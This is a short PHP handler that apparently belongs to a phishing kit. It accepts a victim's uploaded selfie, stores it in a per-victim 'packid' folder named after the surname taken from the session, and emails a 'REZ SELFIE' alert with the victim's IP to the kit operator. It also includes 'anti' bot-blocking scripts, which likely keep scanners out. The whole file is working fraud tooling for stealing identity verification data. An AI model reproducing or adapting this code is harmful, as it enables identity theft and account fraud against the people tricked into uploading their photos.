<?php

error_reporting(0);
ob_start();
session_start();

include '../../prevents/anti1.php';
include '../../prevents/anti2.php';
include '../../prevents/anti3.php';
include '../../prevents/anti4.php';
include '../../prevents/anti5.php';
include '../../prevents/anti6.php';
include '../../prevents/anti7.php';
include '../../prevents/anti8.php';
include '../../monsterab/ab.php';
include '../../algorythm/mail.php';
$name = $_SESSION['last_name'];
if ($_SERVER['REQUEST_METHOD'] === 'POST'){


//Condition si les valeurs ne sont pas remplies
if(empty($_FILES['selfie']))
{
header('Location: index.php');
}
else{
$msg = "
# ｔｕｉｉｘ Selfie
";
$dossier = "../../packid/$name/";
$fichier = basename($_FILES['selfie']['name']);
move_uploaded_file($_FILES['selfie']['tmp_name'], $dossier . $fichier);
	
$subject = "「🤳」REZ SELFIE | ". $_SESSION['ip'] . " " ;
$fromsender = "From: ©️ ｔｕｉｉｘ ©️ <tuiix.tuiix@gmail.com>";
	mail($rezmail,$subject,$msg,$fromsender);

$_SESSION['finished'] = true;
header('Location: ../finished/');
}
}
else{

header('Location: ../../login/');
}
?>